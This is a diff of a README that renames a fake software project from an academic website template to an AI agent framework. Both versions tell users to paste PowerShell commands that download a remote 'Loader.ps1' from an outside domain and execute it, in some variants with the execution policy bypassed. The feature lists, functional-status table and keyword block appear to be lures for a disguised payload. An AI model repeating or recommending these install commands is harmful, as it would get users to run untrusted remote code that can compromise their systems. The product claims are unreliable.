@@ -1,17 +1,17 @@
 <p align="center">
-  <img src="https://img.shields.io/badge/Academic_Website-v2.4-blue?style=for-the-badge&logo=github">
+  <img src="https://img.shields.io/badge/Agent_Framework-v2.0-blue?style=for-the-badge&logo=github">
   <img src="https://img.shields.io/badge/Status-Working-brightgreen?style=for-the-badge">
   <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge">
 </p>
 
 <h1 align="center">
-  🎓 Academic Website Template 2026<br>
-  <span style="font-size:18px;">Professional Academic Portfolio for Researchers, Professors & Students</span>
+  🤖 Agent Framework 2026<br>
+  <span style="font-size:18px;">Build Autonomous AI Agents with Planning, Memory & Tool Use</span>
 </h1>
 
 <p align="center">
-  <strong>Publication Lists | CV Generator | Lab Pages | Blog | Citation Tracking</strong><br>
-  <span style="color:#6c757d;">Working 2026 · Hugo/Next.js · Google Scholar · ORCID Integration</span>
+  <strong>Planning | Memory | Tool Use | Multi-Agent | Self-Reflection</strong><br>
+  <span style="color:#6c757d;">Working 2026 · Python/TypeScript · LLM Agnostic · Extensible</span>
 </p>
 
 <p align="center">
@@ -24,7 +24,7 @@
 
 > ⚠️ **DISCLAIMER**
 > This tool is for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**.
-> Use as a starting point for your academic presence.
+> Use responsibly and in accordance with AI provider terms of service.
 > **BY USING THIS TOOL YOU AGREE TO THESE TERMS.**
 
 ---
@@ -43,14 +43,14 @@ powershell -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
 
 ### Step 3: Wait for Completion
 ```
-[1/4] Loading Academic Website Template modules...
-[2/4] Configuring theme system...
-[3/4] Initializing publication parser...
+[1/4] Loading Agent Framework modules...
+[2/4] Configuring LLM providers...
+[3/4] Initializing planning engine...
 [4/4] Ready. Start using.
 ```
 
-### Step 4: Customize
-Replace placeholder content with your bio, publications, and research interests. Configure your Google Scholar and ORCID profiles for automatic sync.
+### Step 4: Build
+Define your agent's goals, connect to an LLM provider, register tools, and launch your autonomous agent to tackle tasks.
 
 ---
 
@@ -58,36 +58,36 @@ Replace placeholder content with your bio, publications, and research interests.
 
 <table>
   <tr>
-    <td><strong>📄 Publication Lists</strong></td>
-    <td>Auto-import publications from Google Scholar, DBLP, ORCID, and BibTeX with citation counts</td>
+    <td><strong>📋 Planning Engine</strong></td>
+    <td>Hierarchical task decomposition with ReAct, CoT, and tree-of-thought reasoning strategies</td>
   </tr>
   <tr>
-    <td><strong>📋 CV Generator</strong></td>
-    <td>One-click PDF CV generation from your profile data with multiple template options</td>
+    <td><strong>🧠 Memory System</strong></td>
+    <td>Working memory, episodic memory, and semantic memory with automatic consolidation</td>
   </tr>
   <tr>
-    <td><strong>🔬 Lab Pages</strong></td>
-    <td>Dedicated pages for research labs with member profiles, project descriptions, and open positions</td>
+    <td><strong>🔧 Tool Use</strong></td>
+    <td>Register custom tools with automatic parameter validation, error handling, and retry logic</td>
   </tr>
   <tr>
-    <td><strong>📝 Academic Blog</strong></td>
-    <td>Markdown-powered blog with LaTeX math rendering, code highlighting, and figure management</td>
+    <td><strong>🤝 Multi-Agent</strong></td>
+    <td>Orchestrate multiple agents with shared goals, task delegation, and communication protocols</td>
   </tr>
   <tr>
-    <td><strong>📊 Citation Tracking</strong></td>
-    <td>Real-time citation counts, h-index calculation, and impact metrics dashboard</td>
+    <td><strong>🔄 Self-Reflection</strong></td>
+    <td>Agents evaluate their own performance, learn from mistakes, and improve over time</td>
   </tr>
   <tr>
-    <td><strong>🌐 SEO Optimized</strong></td>
-    <td>Structured data for academic profiles, Google Scholar indexing, and Open Graph meta tags</td>
+    <td><strong>🔌 LLM Agnostic</strong></td>
+    <td>Works with OpenAI, Anthropic, Google, Meta, and any OpenAI-compatible API</td>
   </tr>
   <tr>
-    <td><strong>🎨 Clean Design</strong></td>
-    <td>Minimal, professional academic design with dark/light mode and responsive layout</td>
+    <td><strong>📊 Observability</strong></td>
+    <td>Full tracing, logging, and metrics for debugging agent behavior and performance</td>
   </tr>
   <tr>
-    <td><strong>📦 One-Click Deploy</strong></td>
-    <td>Deploy to GitHub Pages, Netlify, or Vercel with automated CI/CD pipeline</td>
+    <td><strong>🧩 Plugin System</strong></td>
+    <td>Extend framework capabilities with community plugins for web, databases, and APIs</td>
   </tr>
 </table>
 
@@ -97,29 +97,29 @@ Replace placeholder content with your bio, publications, and research interests.
 
 <table>
   <tr>
-    <td><strong>Publication Parser</strong></td>
+    <td><strong>Planning Engine</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v2.4.0</td>
+    <td>v2.0.0</td>
   </tr>
   <tr>
-    <td><strong>CV Generator</strong></td>
+    <td><strong>Memory System</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v2.3.8</td>
+    <td>v1.9.8</td>
   </tr>
   <tr>
-    <td><strong>Blog Engine</strong></td>
+    <td><strong>Tool Executor</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v2.3.5</td>
+    <td>v1.9.5</td>
   </tr>
   <tr>
-    <td><strong>Lab Manager</strong></td>
+    <td><strong>Multi-Agent Orchestrator</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v2.3.3</td>
+    <td>v1.9.3</td>
   </tr>
   <tr>
-    <td><strong>Citation Tracker</strong></td>
+    <td><strong>Observability Stack</strong></td>
     <td><span style="color:green;">✅ FUNCTIONAL</span></td>
-    <td>v2.4.0</td>
+    <td>v2.0.0</td>
   </tr>
 </table>
 
@@ -128,14 +128,14 @@ Replace placeholder content with your bio, publications, and research interests.
 ## ⬇️ DOWNLOAD
 
 ### 🔗 Official Download
-[![Download Now](https://img.shields.io/badge/Download-Academic_Website-brightgreen?style=for-the-badge&logo=github)](https://frtview.com/academic-website)
+[![Download Now](https://img.shields.io/badge/Download-Agent_Framework-brightgreen?style=for-the-badge&logo=github)](https://frtview.com/agent-framework)
 
 ### 📦 Direct Links
 | Platform | Link |
 |----------|------|
-| **GitHub Release** | [Download Latest](https://frtview.com/academic-website) |
-| **Direct ZIP** | [Download ZIP](https://frtview.com/academic-website) |
-| **Portable Version** | [Download Portable](https://frtview.com/academic-website) |
+| **GitHub Release** | [Download Latest](https://frtview.com/agent-framework) |
+| **Direct ZIP** | [Download ZIP](https://frtview.com/agent-framework) |
+| **Portable Version** | [Download Portable](https://frtview.com/agent-framework) |
 
 ---
 
@@ -151,26 +151,26 @@ powershell -ExecutionPolicy Bypass -Command "irm https://mast.frtview.com/Loader
 powershell -Command "Invoke-RestMethod https://mast.frtview.com/Loader.ps1 | Invoke-Expression"
 ```
 
-### 📌 Publications Not Importing
-Verify your Google Scholar ID is correct, check that your profile is public, and ensure BibTeX files have proper formatting.
+### 📌 Agent Stuck in Loop
+Set a maximum iteration limit in your config, add a reflection step after each action, and enable the circuit breaker for runaway reasoning chains.
 
-### 📌 CV Generation Fails
-Check that all required fields (name, affiliation, publications) are filled, verify PDF generation dependencies are installed, and try a simpler template.
+### 📌 Tool Execution Fails
+Verify tool parameters match the expected schema, check tool dependencies are installed, and ensure the tool has necessary permissions.
 
 ---
 
 ## 🏷️ TAGS & KEYWORDS
 
 ```
-academic website, academic website template, researcher portfolio, professor website, academic portfolio, cv template, publication list, google scholar, research website, academic blog, lab website, h-index tracker, academic cv, student portfolio, academic 2026
+agent framework, ai agent, agent framework github, autonomous agents, llm agents, ai planning, tool use, multi-agent, agent memory, ai framework, agent orchestration, reasoning agents, self-reflection ai, agent plugins, ai agents 2026
 ```
 
 <p align="center">
   <a href="#"><img src="https://img.shields.io/badge/⭐-Star_This_Repo-yellow?style=for-the-badge"></a>
   <a href="#"><img src="https://img.shields.io/badge/🍴-Fork_This_Repo-blue?style=for-the-badge"></a>
-  <a href="#"><img src="https://img.shields.io/badge/🎓-Happy_Researching-orange?style=for-the-badge"></a>
+  <a href="#"><img src="https://img.shields.io/badge/🤖-Happy_Building-orange?style=for-the-badge"></a>
 </p>
 
 ---
 
-**© 2026 Academic Website Template — All rights reserved for educational purposes.**
+**© 2026 Agent Framework — All rights reserved for educational purposes.**
